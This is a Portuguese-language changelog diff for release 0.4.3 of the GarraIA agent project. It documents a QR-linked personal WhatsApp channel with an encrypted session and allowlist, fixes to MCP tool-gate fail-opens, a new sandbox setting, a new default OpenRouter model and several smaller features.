@@ -6,6 +6,2095 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
 ## [Unreleased]
 
+## [0.4.3] - 2026-09-21
+
+Release em que o Garra entrou no WhatsApp pessoal. Ate aqui o canal WhatsApp
+era so a Meta Cloud API — conta Business, numero cadastrado na Meta e URL
+publica, barreira que o usuario domestico nao passa. Agora `garra whatsapp`
+mostra um menu de duas opcoes, desenha um QR code no terminal e o numero que ja
+esta no bolso do operador passa a falar com o agente (ADR 0023). A divisao de
+trabalho e o ponto: uma ponte Node/Baileys stateless cuida so do protocolo do
+WhatsApp e fala NDJSON por stdio, enquanto o Rust desenha o QR, cifra a sessao
+em repouso (AES-256-GCM em `<data_dir>/whatsapp/default/`, 0600 em diretorio
+0700), aplica allowlist propria e fail-closed, e supervisiona o processo filho
+no regime do MCP — `env_clear` com allowlist de ambiente, PDEATHSIG, filho
+morrendo no `Drop`, keepalive por ping/pong e redacao da cauda do stderr —
+menos o RLIMIT_AS, que o V8 do Node nao tolera. Node.js 20+ vira requisito so
+desse caminho; a Cloud API continua sem ele. O pareamento com aparelho real e
+validacao manual, e o CI cobre protocolo, maquina de estados, store cifrado e
+ciclo de vida contra uma ponte falsa.
+
+E a maior faixa de seguranca de uma release ate hoje, e quase toda ela fecha
+controles que existiam e nao valiam. Cinco fail-opens do MCP: o restart pela
+admin API apagava a allowlist de tools, o DELETE nao derrubava a conexao viva,
+a whitelist do modo isentava qualquer nome com `__`, a entrada HTTP do
+`mcp.json` era descartada pelo loader e uma escrita de admin apagava o que os
+outros servidores declaravam. O filho MCP deixa de herdar o ambiente inteiro
+do gateway e `vault:` passa a ser resolvido no boot, fail-closed. O gate de
+`gateway.api_key` passa a cobrir o plano de conversa, o A2A e o socket do
+papagaio; o wizard gera credencial quando o bind e exposto; as file tools
+ganham jail de diretorio; o guard de injecao indireta se estende a MCP,
+`file_read` e dispositivos; `repo_search` e `git_diff` deixam de entregar
+texto do modelo em posicao de flag; e `POST /api/providers` conecta com
+cliente pinado aos IPs vetados. O sandbox por tool, entregue inteiro na
+#1222 e inalcancavel por qualquer instalacao, ganha a secao `agent.sandbox` —
+nova, default `off`, cobrindo hoje so a tool `bash`, com o backend `ssh`
+dizendo em letras claras que e execucao remota e nao sandbox.
+
+No runtime, o Garra passa a ter um LLM padrao so: `z-ai/glm-5.3-flash` via
+OpenRouter em todas as superficies (ADR 0022), com o local como segunda opcao.
+O auto-router de modo vale em todos os pontos de entrada, rede caida cai ao
+fallback local em vez de matar o turno, o 404 de roteamento do OpenRouter vira
+erro de configuracao acionavel e parametro ausente numa tool vira observacao
+soft. O `garra chat` grava a pergunta antes do turno e retoma o ultimo turno
+interrompido com `--resume`, o `/model` virou transacional, o REPL parou de
+exibir tracing cru e o ledger de runs ganhou o primeiro escritor de producao.
+
+Fora disso: o catalogo de hardware skills passa a classificar risco em runtime,
+o ADR 0021 do Desktop Control Center foi aceito e entregou a crate
+`garraia-desktop-core` e o `garra desktop`, o Garra Mobile fala pt-BR e ingles
+com o icone certo, o S3 ganhou multipart com checksum por parte, toda crate
+declara a MSRV 1.95 e o formato dos fragmentos de changelog virou gate de CI.
+Nenhuma migracao de dado e necessaria. Tres coisas mudam de significado:
+`gateway.allowed_origins` vazio passa a ser "nenhuma origem cross-origin",
+`GARRAIA_MCP_MODEL_ALLOWLIST=openrouter/free` precisa incluir o default novo,
+e o autodetect do `garra chat` tenta a nuvem antes do Ollama.
+
+### Added
+- **Garra Mobile em portugues do Brasil e ingles, com seletor de idioma (#1178).**
+  O app era uma mistura de ingles e portugues sem opcao de idioma. Agora toda a
+  copy de UI (telas, botoes, dialogos, erros, estados vazios, tooltips, canais de
+  notificacao, prompt biometrico) sai de `lib/l10n/app_en.arb` + `app_pt.arb`
+  via `context.l10n` (Flutter gen_l10n, 255 chaves, plurais e placeholders em
+  ICU), e as strings do proprio Material (menu de selecao de texto, tooltips
+  padrao) seguem o idioma via `flutter_localizations`. Settings ganha o cartao
+  **Idioma**: Padrao do sistema / English / Portugues (Brasil), persistido em
+  SharedPreferences e aplicado na hora, sem reiniciar; sistema em pt-BR abre o
+  app em pt-BR (qualquer variante `pt` cai em pt-BR, o resto em ingles). Um teste
+  (`test/l10n_hardcoded_strings_test.dart`) varre `lib/` e falha em string de UI
+  hard-coded nova. Fica de fora, de proposito: valores que vem do runtime
+  (nomes de provider/modelo, `status` de health, descricoes de comandos/modos
+  do servidor) e o fallback `unknown` dos modelos — sao dados do gateway, nao
+  copy do app.
+- **ADR 0021 propoe o GarraIA Desktop Control Center (#1181).** Uma aplicacao
+  grafica central (`garraia desktop`) que reune agentes, providers, integracoes,
+  logs e os toggles do passaro e da Chat Bar, sem remover nada do desktop atual.
+  A decisao central nao e de UI: `garraia-desktop` so tem build em PR (via
+  `desktop.yml`, que nao e check obrigatorio) e nenhum lint ou teste, entao a
+  logica vai para uma crate nova sem Tauri (`garraia-desktop-core`), que cai nos
+  checks obrigatorios. As abas reaproveitam a superficie `/api/*` do gateway,
+  com as mutantes condicionadas ao conserto da exposicao cross-origin (#1182), e
+  a aba de agentes e cliente do AgentDeck em vez de reimplementar os adapters.
+  Status proposed: a aceitacao e do dono.
+- **`garra desktop` — a CLI abre o aplicativo desktop (#1181, milestone M1).**
+  Ate aqui o controle so ia num sentido: o desktop lancava a CLI como sidecar
+  Tauri. Agora existe o caminho inverso. `garra desktop` localiza o aplicativo
+  instalado e o lanca; `--status` diz se esta instalado e onde; `--no-launch`
+  so imprime o caminho resolvido, para script. Exit codes sysexits, no mesmo
+  padrao do `config check`: 0 ok, 69 nao instalado, 70 encontrado mas nao
+  abriu — um script consegue separar os dois casos.
+  A resolucao tenta, nesta ordem, o diretorio do instalador da plataforma, a
+  PATH e o diretorio da propria CLI. O diretorio do instalador vem primeiro
+  porque e o unico dos tres que um terceiro nao ocupa por acidente. Ela mora
+  em `garraia-desktop-core`, e nao na CLI, por dois motivos: e a crate que
+  entra nos gates obrigatorios de CI, e a casca vai precisar da mesma lista de
+  caminhos no M2 — uma segunda copia dela divergiria no primeiro instalador
+  novo. A CLI continua sem nenhuma dependencia de Tauri, com um teste varrendo
+  o proprio fonte para garantir isso, entao `cargo build --workspace --exclude
+  garraia-desktop` e toda instalacao headless seguem intactos.
+  O invariante que mais importa: a resolucao **nunca** devolve o proprio
+  executavel. No `.deb` do desktop os dois binarios sao irmaos no mesmo
+  diretorio (`/usr/bin/garraia` e `/usr/bin/garraia-desktop`, com
+  `Provides/Conflicts/Replaces: garraia`), e e exatamente ali que um
+  lancamento recursivo nasceria.
+  Uma coisa o comando de proposito nao responde: se o aplicativo **ja esta
+  rodando**. Responder isso exigiria enumerar processos nas tres plataformas
+  por nome — heuristica fragil e dependencia nova — ou um canal de instancia
+  unica na casca Tauri, que e onde a resposta pode ser confiavel. Esse canal e
+  do M2; ate la o `--status` diz que nao sabe, em vez de imprimir um "nao" que
+  seria falso toda vez que a janela estivesse aberta.
+- **Crate `garraia-desktop-core`, o nucleo sem Tauri do Desktop Control Center
+  (#1181, milestone M0).** `garraia-desktop` esta excluida de todos os gates
+  obrigatorios de CI — o `build.rs` do Tauri exige GTK/webkit que os runners
+  nao tem — e por isso nao tem cobertura automatizada nenhuma. A crate nova e
+  o outro lado dessa fronteira: leva a logica que nao precisa de janela para um
+  lugar que o CI compila, linta e testa. Tres modulos: `state` (ligado/
+  desligado como estado puro, sem relogio nem I/O, separando o que o usuario
+  pediu do que de fato acontece), `detect` (deteccao de agentes que e leitura e
+  nunca execucao — um nome na PATH nao prova identidade, entao sem corroboracao
+  a deteccao fica `Ambiguous`, com um teste varrendo o proprio fonte para
+  garantir que nenhum caminho de execucao apareca depois) e `supervise`
+  (launch/restart/kill extraidos do `gateway.rs` da casca Tauri, agora sem
+  `unwrap` em lock, sem `sleep` por dentro e com o filho morrendo junto com o
+  supervisor via `Drop`). Nenhuma crate a consome ainda: a migracao da casca e
+  o `garraia desktop` da CLI sao dos milestones seguintes.
+- **Multipart upload nativo do S3 para arquivos acima de 16 MiB (#1214).**
+  `S3Compatible::put_stream` bufferizava o corpo inteiro em memoria antes de
+  subir, o que tornava um upload de 5 GiB (o teto do ledger `tus_uploads`,
+  migration 014) inviavel. Agora `content_length <= 16 MiB` segue no caminho
+  unico `put_object` e acima disso o upload vai por `create_multipart_upload`
+  + partes de 8 MiB + `complete_multipart_upload`, derrubando o pico de
+  memoria de 5 GiB para 8 MiB por upload em voo. SSE-S3 (AES256) e fixado na
+  criacao e herdado por todas as partes, a allow-list de MIME roda antes da
+  escolha do caminho, e o `etag_sha256` continua sendo o sha256 do conteudo
+  completo — entao o HMAC de integridade sobre `{key}:{version_id}:{sha256}`
+  vale igual nos dois caminhos. Qualquer falha — erro no stream, erro numa
+  parte, erro no proprio `complete`, stream vazio ou stream que entrega menos
+  bytes do que declarou — aborta o multipart, para que a chave nunca exponha
+  conteudo parcial e nenhuma parte orfa fique sendo faturada. Acompanha um
+  `docker-compose.minio.yml` de desenvolvimento (API :9000 e console :9001
+  presos a 127.0.0.1, bucket `garraia-dev` criado por um one-shot `mc`).
+- **`memory.auto_extract` e `memory.max_facts` — o auto-learning de fatos
+  finalmente tem knob (#1221).** Com a memoria ligada, o `AgentRuntime`
+  disparava `MemoryExtractor::extract_facts` em **todo** turno do usuario: uma
+  chamada LLM extra, incondicional, sem nenhuma forma de desligar so ela. Quem
+  usa provider pago ou com rate limit pagava a extracao em cada mensagem e a
+  unica saida era desligar a memoria semantica inteira — jogar fora a busca
+  para economizar a escrita. As duas chaves ja eram prometidas por docs
+  antigas; agora existem de verdade.
+  `memory.auto_extract` (default `true`) desliga apenas a chamada de extracao,
+  preservando a memoria semantica. `memory.max_facts` (default sem teto) limita
+  quantos fatos um unico turno pode gravar, mantendo os de maior confidence —
+  ordenacao estavel, entao empate resolve pela ordem de chegada. Os dois
+  defaults reproduzem exatamente o comportamento historico: quem nao mexer no
+  `config.yml` nao percebe diferenca.
+  A validacao que vivia inline no loop (confidence minima de 0.80, key e value
+  nao vazios) saiu para `select_learned_facts`, uma funcao pura — era a unica
+  forma de afirmar o teto e o desempate em teste sem subir um provider.
+  `extraction_interval`, a terceira chave que as docs prometiam, ficou
+  deliberadamente de fora: e a de menor ganho das tres e exigiria um contador
+  de turnos por sessao, estado novo para economizar menos que o simples
+  desligar.
+- **Runs de sub-agente deixam rastro auditavel, e um restart nao os perde em
+  silencio (#1224).** Os sub-agentes do `AgentCoordinator` morriam com o
+  processo e nao deixavam nada para tras — mesma limitacao do `delegate_task`
+  do Hermes. Quem derrubasse o gateway no meio de uma delegacao ficava sem
+  saber que ela existiu, muito menos que ficou pela metade.
+  Agora existe a tabela `agent_runs` e o `SessionStore` sabe abrir, fechar e
+  listar run: `start_agent_run` e idempotente e nao reabre run que ja terminou,
+  e `mark_interrupted_runs()` converte todo run que ficou `running` em
+  `interrupted`, devolvendo a lista para o operador. O `AgentCoordinator` fala
+  com isso por um `RunLedger`, cujo default e um `NoopLedger` de custo zero —
+  quem nao injeta o adapter nao paga nada.
+  O que **nao** mudou, e vale dizer com todas as letras: o run continua sem
+  sobreviver ao processo, e nesta fatia `AgentCoordinator::spawn_agent` segue
+  sem chamador de producao — a fatia original entregou CLI e gateway sem
+  gravar run nenhum. O primeiro escritor real do ledger (scheduler de
+  heartbeats gravando cada execucao e a subida do gateway/CLI marcando runs
+  interrompidos) entra pela #1227. O que existe aqui e o
+  schema + a auditoria funcionando, prontos para o chamador. Retomar um run
+  interrompido, e ligar o ledger a um caminho de producao, e a #1227.
+  Os snippets gravados sao truncados em 500 caracteres de proposito: o ledger e
+  auditoria, nao armazenamento de conversa.
+
+- **`ToolRegistry::execute_program` — prototipo do Code Mode em `garraia-tools`
+  (#1224).** Um pipeline de N tools custava N inferencias, porque o modelo
+  voltava ao loop entre cada passo. A funcao recebe um programa JSON
+  (`steps: [{tool, args, as}]`) e executa os passos em sequencia, sem voltar
+  ao modelo entre eles.
+  A substituicao de variaveis e deliberadamente tudo-ou-nada: um arg **e** a
+  variavel ou nao e, sem interpolacao dentro de string maior — nada de injecao
+  de prefixo. Falha em qualquer passo encerra o programa com o indice do passo,
+  e o orcamento de `max_steps` (16 por default) impede que um programa vire
+  loop.
+  O que ela **nao** e, com todas as letras: nao e o runtime executando nada.
+  Ela vive em `garraia-tools`, crate da qual o `AgentRuntime` (em
+  `garraia-agents`) nao depende; nao consulta o `ToolGate` dos modos; e nao
+  tem nenhum chamador fora dos proprios testes da crate. A `tool_program`
+  intrinseca do `AgentRuntime`, com gate por passo, e a #1226 (S-B) — e e la
+  que o caminho se torna alcancavel. Ate entao a funcao fica marcada
+  `#[deprecated]` (#1226 S-E), para que ninguem a ligue ao loop por fora do
+  gate.
+- **Teste de integracao do sandbox contra Docker real prova `--network none` e o mount do cwd (#1225 S4).**
+  Ate aqui todo teste do sandbox por tool olhava a STRING que `wrap_command`
+  monta — nenhum subia um container, entao um Docker que ignorasse a flag, ou
+  um wrap que deixasse o comando rodar no host, manteria a suite verde.
+  `crates/garraia-agents/tests/sandbox_docker.rs` dirige a `BashTool` com a
+  policy Docker de verdade (imagem default `debian:bookworm-slim`, pull
+  implicito, timeout de 120 s): o `echo` sai de dentro do container
+  (`/.dockerenv` presente em todo comando, para um comando que rodasse no host
+  nao passar), `getent hosts example.com` falha com `network_disabled = true` e
+  resolve no controle com a rede ligada (pulado com aviso se o proprio runner
+  nao tiver rede), e um arquivo criado no cwd do host e lido por `cat` por
+  caminho relativo la dentro — e deixa de ser visivel com `mount_workdir =
+  false`. Sem daemon o teste se pula com aviso; `GARRAIA_REQUIRE_DOCKER=1`,
+  que o CI liga no runner Linux num step proprio ao lado do de `storage-s3`,
+  transforma o skip em falha, no mesmo padrao do `s3_integration.rs`.
+- O ledger de runs tem o primeiro escritor de producao (#1227, slice 1). A
+  subida do gateway e do CLI converte runs `running` deixados por uma queda
+  em `interrupted`, com ids no log (nunca o `goal`, que e PII), e cada
+  execucao de tarefa agendada do scheduler deixa uma linha em `agent_runs`
+  com `session_id` preenchido e desfecho terminal (`done`/`error`) — uma
+  queda no meio da execucao aparece como `interrupted` no restart seguinte,
+  em vez de sumir. Falha do ledger e fail-soft: nunca impede a tarefa nem
+  muda o fluxo de retry do scheduler.
+- **ADR 0023 decide como o WhatsApp pessoal vai funcionar (#1238).** O canal
+  WhatsApp de hoje e a Meta Cloud API, que exige conta Business, numero
+  cadastrado na Meta e URL publica — barreira que o usuario domestico nao
+  passa. O ADR registra o caminho do WhatsApp **pessoal**, por dispositivo
+  vinculado com QR code, planejado para a v0.4.3 sob `garra whatsapp`: um
+  bridge Node/Baileys **stateless** falando NDJSON por stdio, com o Rust dono
+  do estado (sessao num blob unico AES-256-GCM, 0600 em diretorio 0700, chave
+  vinda da passphrase do cofre ou de um `session.key` proprio), supervisao no
+  mesmo regime do MCP (`env_clear` + allowlist de env, PDEATHSIG, RLIMIT_AS,
+  filho morre no `Drop`), maquina de estados pura no molde do
+  `garraia-desktop-core`, e canal pull separado (`whatsapp_linked`) com
+  allowlist e pareamento obrigatorios e tools read-only por default. Duas
+  consequencias ficam escritas em vez de escondidas: Node.js vira requisito
+  **so desse caminho**, o que arranha o "12 canais num binario" (agora com nota
+  de rodape na comparacao), e cliente nao-oficial pode levar ao bloqueio da
+  conta — por isso ha tela de consentimento antes do primeiro QR e recomendacao
+  de numero secundario. Alternativas avaliadas: Go/whatsmeow como asset
+  estatico (adiada, mexe na superficie de assets de release, R5 do dono),
+  protocolo nativo em Rust (inviavel) e reusar o daemon do OpenClaw (destroi o
+  "um comando, uma tela"). Nada disso existe ainda em build publicado; o ADR e
+  a decisao, nao a entrega.
+- **`garra whatsapp` conecta o WhatsApp pessoal lendo um QR code no terminal
+  (#1238, ADR 0023).** Um comando, um menu de duas opcoes: numero pessoal por
+  QR (`garra whatsapp link`) ou WhatsApp Business pela Cloud API oficial da
+  Meta (`garra whatsapp cloud`). Tambem `garra whatsapp status` e `garra
+  whatsapp logout`. Sem terminal o comando nao trava nem falha: imprime as
+  duas opcoes com o comando de cada uma e sai 0, como o `garra init`.
+  A sessao fica cifrada em repouso (AES-256-GCM, a mesma pilha do
+  `CredentialVault`) em `<data_dir>/whatsapp/default/session.enc`, com
+  arquivos 0600 dentro de um diretorio 0700 e escrita atomica. A chave e
+  derivada de `GARRAIA_VAULT_PASSPHRASE` quando ela existe; sem ela fica num
+  arquivo local e o `status` avisa disso em letras claras. `enabled = true` so
+  e gravado na config **depois** de a sessao existir em disco, entao um
+  pareamento abortado nao deixa o gateway pagando timeout a cada boot. Antes
+  do primeiro QR ha uma tela de consentimento: cliente de aparelho vinculado
+  nao e oficial, a conta pode ser bloqueada e a recomendacao e usar um numero
+  secundario. **Nada destrutivo acontece antes dessa ultima confirmacao**: quem
+  pede para re-vincular so tem a sessao atual posta de lado depois de aceitar o
+  consentimento e de o Node ser encontrado, entao recusar, dar Ctrl+C ou nao
+  ter Node deixa o vinculo que funcionava exatamente como estava. **E depois
+  dela tambem nao**: um re-vinculo que nao chega a gravar sessao nova — QR
+  expirado, Ctrl+C na tela do QR, ponte que morre antes de conectar, ou o
+  proprio WhatsApp recusando o vinculo novo (401/403/419) — restaura a sessao
+  anterior e avisa que restaurou. A antiga so e descartada quando a nova
+  existe em disco, e se por algum motivo a restauracao nao acontecer o comando
+  diz isso em vez de calar. E `garra
+  whatsapp cloud` rodado so para trocar um token preserva as demais chaves que
+  o operador ja tinha em `channels.whatsapp`. Vincular precisa de Node.js 20 ou
+  mais novo — so este caminho precisa; a Cloud API nao.
+  **O pareamento de ponta a ponta com um telefone real e validacao manual**, e
+  esta descrito passo a passo em `docs/whatsapp.md`. O CI cobre protocolo,
+  maquina de estados, store cifrado, desenho do QR e ciclo de vida do processo
+  filho contra a ponte falsa em Python, sem Node e sem telefone.
+  **A ligacao com o gateway (canal pull `whatsapp_linked` e o check em
+  `/api/diagnostics`) chega no slice seguinte**: por ora o comando vincula e
+  guarda a sessao, e o gateway ainda nao le esse canal.
+- **`garra whatsapp restore` devolve a sessao que ficou arquivada (#1238).**
+  Quando um re-vinculo e interrompido de um jeito que nao da ao GarraIA a
+  chance de desfaze-lo — `kill -9`, queda de energia —, a sessao boa fica em
+  `session.enc.prev` sem `session.enc`. A funcao que a traz de volta ja
+  existia e nenhuma superficie a expunha: o `status` via o arquivado e mandava
+  APAGAR. Agora ele oferece a recuperacao primeiro, e o comando novo renomeia
+  o arquivo de volta, aperta o modo para 0600 e religa o canal na config —
+  nessa ordem, a mesma do `link`. Ele nunca passa por cima de uma sessao em
+  uso: nesse caso diz o que ha e sai 69, sem apagar nada.
+- **Ponte WhatsApp em Node/Baileys, stateless, falando NDJSON v1 por stdio
+  (#1238, ADR 0023 slice S4a).** `bridge/whatsapp/` e um diretorio, nao uma
+  crate: fica fora do workspace Cargo e o Rust o spawna como processo filho.
+  A divisao de trabalho e o ponto — a ponte cuida do protocolo do WhatsApp
+  (Baileys pinado exato em `7.0.0-rc14`) e o Rust cuida de tudo que e do
+  GarraIA: desenhar o QR, cifrar e gravar a sessao, aplicar allowlist, rotear
+  para o agente. A ponte **nunca escreve no disco**; o estado de autenticacao
+  vive em memoria e volta por `session_update` como snapshot completo, para o
+  `CredentialVault` gravar cifrado. stdout e exclusivamente NDJSON (logger do
+  Baileys em `silent` apontado para o fd 2), e todo diagnostico sai por evento
+  `log` ja redigido para os 4 ultimos digitos. Acompanha a fixture
+  `crates/garraia-channels/tests/fixtures/fake_whatsapp_bridge.py`, que fala o
+  mesmo protocolo em milissegundos, para que os testes Rust rodem sem Node e
+  sem telefone, e um `protocol-lint` que arbitra as duas contra o contrato.
+  Nada no workspace Rust consome a ponte ainda: o wiring da CLI e do gateway
+  vem no PR companheiro.
+- **O canal pull `whatsapp_linked` no gateway (#1238, ADR 0023 slice S4d).**
+  E a peca que faltava para a mensagem escaneada pelo QR chegar ao agente: ate
+  aqui `garra whatsapp link` pareava e nada acontecia. O gateway supervisiona a
+  ponte Node/Baileys em `mode: "serve"`, entrega cada `message` ao runtime e
+  responde pelo comando `send`. Canal PULL sem registry e sem webhook — quem
+  vive e um processo filho com loop de reconexao proprio —, entao o status sai
+  do supervisor e nao do `ChannelRegistry`, pelo mesmo motivo que os canais
+  push da #1079 precisaram de fonte propria.
+  O modelo de ameaca deste canal e outro: a mensagem vem de qualquer pessoa que
+  conheca o numero pessoal do operador. Tres decisoes saem disso, nenhuma
+  configuravel para menos. (1) **Fail-closed de verdade**: o canal tem
+  **allowlist propria**, e nao a global da instalacao — entra-se com codigo do
+  `/pair` ou pela lista `allow` da config, e portao vazio significa ninguem. A
+  allowlist global nao serve aqui porque *todo* canal irmao a preenche sozinho
+  por auto-claim do primeiro remetente, o que faria de um estranho que mandou
+  "oi" para o numero Cloud um remetente admitido no numero pessoal do operador.
+  Como consequencia, `allow` deixou de ser gravado no `allowlist.json` global:
+  a config e a fonte de verdade, o que sai do `allow` sai do portao (antes nao
+  havia revogacao por config), e um numero liberado aqui nao vira identidade
+  valida em Telegram, Discord, Slack, Signal, Matrix ou no `/start`. Pareamento
+  vale para a execucao corrente; acesso duravel se declara no `allow`.
+  (2) **Ferramentas somente-leitura por padrao**: sessao sem modo escolhido
+  resolve para o perfil `search`, e nao para "sem politica", ate o operador
+  subir o nivel com `/mode`. Enquanto a #1264 estiver aberta, esse piso **nao
+  cobre ferramenta de servidor MCP** (o `ToolGate` deixa passar qualquer
+  `servidor__tool` pelo whitelist), entao o canal se recusa a subir se houver
+  uma registrada no boot e recusa cada turno cuja entrada encontre uma
+  registrada. Nao e invariante continua: entre um turno e o seguinte o
+  inventario pode mudar (o monitor de saude do MCP re-sincroniza a cada 30 s),
+  e o que o controle entrega e a reducao da janela de minutos para o intervalo
+  entre dois turnos. O detector pergunta o MESMO que a escapatoria do
+  `ToolGate` pergunta — origem MCP **ou** `__` no nome —, e nao so a origem,
+  para que uma ferramenta nativa de nome com `__` nao fure o whitelist sem
+  acender nada. (3) **Guard de injecao
+  indireta no texto recebido**, aplicado localmente porque a #1243 (que propoe
+  generaliza-lo para alem do `web_fetch`) nao mergeou.
+  Grupo so responde com opt-in explicito, e mensagem propria (`from_me`) nunca
+  gera turno — sem esse filtro o canal responderia as proprias respostas para
+  sempre, ja que a conta vinculada e a do operador.
+  `garra whatsapp status`, `GET /api/channels` e o check `whatsapp.linked` do
+  `GET /api/diagnostics` classificam pela MESMA funcao
+  (`whatsapp_linked::health::classify`), com proximo passo acionavel em cada
+  modo de falha — "rode `garra whatsapp link`" sem sessao, "rode `npm ci` em
+  <dir>" sem dependencias na ponte. Duas fontes divergentes sobre o mesmo canal
+  e o defeito que a #1079 ja custou uma vez.
+  E o desligamento do gateway **cancela o supervisor**: o `cancelar()` existia,
+  estava correto e nao tinha chamador de producao, entao depois do Ctrl+C o
+  processo imprimia "shut down gracefully" com a ponte Node viva e turnos de
+  agente rodando. A rota "o `Sender` cai junto com o `AppState`" nao existe
+  aqui, por um ciclo de `Arc` (o sink do canal detem o estado que detem o
+  cancelamento), e por isso o cancelamento e explicito.
+  A varredura de PII do canal e a do gateway compartilham **uma** implementacao
+  (`whatsapp_linked::log_audit`), e nao duas mantidas iguais por disciplina:
+  cada conserto do parser — string crua, literal de char, comentario de bloco,
+  macro sem delimitador — chega as duas de uma vez. A regra principal deixou de
+  ser "reprove a macro que eu conheco" e passou a ser a allowlist fechada de
+  call site do `expose()`, porque e no call site que a protecao de tipo acaba:
+  dali em diante o valor e um `&str`, e `let s = blob.expose(); let t = s;
+  info!(dado = %t)` nao e alcancado por leitura de macro nenhuma. A lista de
+  macros ficou como segunda linha, cobrindo o que a primeira nao cobre (um
+  campo `session`/`blob`/`creds`/`qr` que nunca passou por `expose()`).
+- **O REPL do `garra chat` ganhou editor de linha: setas, historico e edicao
+  (#1297).** Ate aqui o loop lia com `read_line` em modo canonico, e quem
+  editava a linha era o driver do terminal — seta para cima imprimia `^[[A`,
+  nao havia historico nem edicao no meio da linha. Agora o prompt e um
+  `rustyline` (MIT): setas navegam o historico, Home/End/Ctrl+A/Ctrl+E/Ctrl+W
+  editam, Ctrl+R busca. O historico vive em memoria durante a sessao e so vai
+  ao disco quando a sessao e persistida (`--persist`/`--resume`), respeitando
+  o contrato do #1088 de que sem `--persist` nada e escrito; quando gravado,
+  mora em `garraia_dir()/history` (nunca `~/.garra`), criado com `0600` no
+  Unix porque o que se digita num chat pode ser sensivel; linha comecando com
+  espaco fica de fora, como no shell. Falha ao carregar ou gravar e fail-soft
+  — vira aviso e a sessao segue sem historico.
+  O editor so entra quando stdin, stdout **e** stderr sao terminal. `echo
+  pergunta | garra chat`, CI e os testes de integracao continuam no
+  `read_line` byte a byte, identico ao de antes; `NO_COLOR` e `TERM=dumb`
+  tiram a cor, nao as setas.
+  O dono do SIGINT continua sendo um so, o vigia do `run_chat` — o rustyline
+  entra com a feature `signal-hook`, que e o que o impede de instalar um
+  `sigaction(SIGINT)` proprio a cada `readline` (so SIGWINCH, pelo mesmo
+  registro cooperativo que o tokio usa). Em raw mode o Ctrl+C no prompt ocioso
+  chega como leitura interrompida em vez de sinal, e o REPL encerra com o
+  mesmo 130 de sempre; durante o turno o terminal ja esta em modo canonico e o
+  Ctrl+C segue cancelando o turno. Ctrl+D encerra como `/exit`. Um `kill -INT`
+  externo recebido com o editor em raw mode vai ao vigia, que devolve os
+  atributos do terminal antes de sair, para o shell nao ficar sem eco.
+
+### Changed
+- **`z-ai/glm-5.3-flash` via OpenRouter passa a ser o LLM padrao oficial (#1180).**
+  A pergunta "qual LLM o Garra usa quando o usuario nao escolhe nada?" tinha
+  cinco respostas diferentes conforme a porta de entrada: `garra chat` e o
+  wizard diziam `openrouter/auto`, o `garra mcp-server` dizia `openrouter/free`,
+  o gateway caia em `openai/gpt-4o` para um bloco `openrouter` sem `model:`
+  explicito, e o Garra Desktop nascia em `lmstudio`. Agora ha uma constante
+  unica em `garraia_config::defaults` que todas as superficies leem, travada
+  por teste (ADR 0022). O local (Ollama, `qwen3.8:latest`) continua inteiro, mas como
+  **segunda** opcao: entra em `agent.fallback_providers` e so vira primario
+  se o usuario pedir. O wizard passa a destacar "Cloud-first" em vez de
+  "Local-first" mesmo em maquina com GPU.
+- **`openrouter/auto` e `openrouter/free` deixam de ser padrao em qualquer
+  superficie (#1180).** Os dois continuam validos como escolha explicita
+  (`--model openrouter/auto`, `model: "openrouter/free"` numa chamada MCP);
+  o que muda e que nenhum caminho de codigo os seleciona sozinho. No MCP o
+  `openrouter/free` era um guardrail de custo deliberado - um host pode chamar
+  `garra_ask` em loop - e essa intencao foi preservada e documentada: o
+  flash-tier e barato o bastante para ser o padrao nao-assistido, e
+  `GARRAIA_MCP_MODEL_ALLOWLIST` continua sendo o teto duro do operador.
+- **ATENCAO, quebra para quem fixou o `GARRAIA_MCP_MODEL_ALLOWLIST` (#1180).**
+  Quem seguiu `docs/hermes-integration.md` e exportou
+  `GARRAIA_MCP_MODEL_ALLOWLIST=openrouter/free` precisa atualizar o allowlist
+  para incluir `z-ai/glm-5.3-flash` (ou remover a variavel). O allowlist e
+  avaliado DEPOIS de o default novo ja ter sido aplicado, entao toda chamada
+  MCP sem `model` explicito passa a falhar com `invalid_params` ate o
+  allowlist ser ajustado. Exemplo:
+  `export GARRAIA_MCP_MODEL_ALLOWLIST=z-ai/glm-5.3-flash,openrouter/free`.
+  A mensagem do `invalid_params` passa a dizer, quando o modelo rejeitado e
+  o default do servidor, que ele e o default (#1180) e como ajustar - em vez
+  de deixar o operador conferir o allowlist contra um valor que nunca digitou.
+- **`POST /api/providers` do Web Console tambem usa o default do projeto
+  (#1180).** O "Save & Activate" numa instalacao limpa manda so a chave, sem
+  `model`, e esse caminho do `router.rs` caia num `openai/gpt-4o` hardcoded
+  proprio - a sexta resposta, fora do alcance da constante. Agora um `model:`
+  ja escrito no bloco `openrouter` do `config.yml` (por chave ou por
+  `provider: openrouter`) vence; sem ele, `z-ai/glm-5.3-flash`.
+- **O gateway passa a respeitar `agent.default_provider` no boot (#1180).**
+  Com mais de um provider em `llm:`, o default efetivo era o primeiro que a
+  iteracao do `HashMap` devolvia - ou seja, sorteio a cada boot. Agora o
+  provider nomeado em `agent.default_provider` e aplicado explicitamente; um
+  nome que nao corresponda a nenhum provider registrado vira aviso no log e
+  mantem o que havia, sem derrubar o boot.
+- **O autodetect do `garra chat` tenta a nuvem antes do Ollama (#1180).** Sem
+  `agent.default_provider` no config, a cadeia legada tentava o Ollama local
+  primeiro mesmo com `OPENROUTER_API_KEY` exportada. Agora os provedores de
+  nuvem com credencial vem primeiro (Anthropic > OpenAI > OpenRouter) e o
+  Ollama e o que sobra quando nenhuma credencial de nuvem existe. Quem contava
+  com o Ollama vencendo uma chave de nuvem exportada deve fixar
+  `agent.default_provider: ollama` no `config.yml`.
+- **O wizard nao preseleciona mais o download local no caminho cloud-first
+  (#1180).** Escolhendo "Cloud-first", o confirm de instalar o Ollama nasce em
+  "nao" e o seletor de modelo local cai na linha de pular o download - os
+  ~18 GB viraram um sim explicito. No caminho "Local-first" nada mudou.
+- **ADR 0021 (GarraIA Desktop Control Center) aceito pelo dono (#1181).** A opcao D
+  passa de proposta a decisao: crate `garraia-desktop-core` sem Tauri (no CI, com
+  testes), casca Tauri fina, abas servidas pela superficie `/api/*` do gateway (as
+  mutantes ja cobertas pela guarda anti-CSRF do #1182) e aba Agents como cliente do
+  AgentDeck. Os milestones do epico podem comecar, na ordem core -> CLI -> casca ->
+  abas. Ficam pendentes, como o ADR previa, o gatilho S1 do ADR 0007 (framework de
+  UI, no inicio do M2) e o desenho da dependencia do AgentDeck (M3).
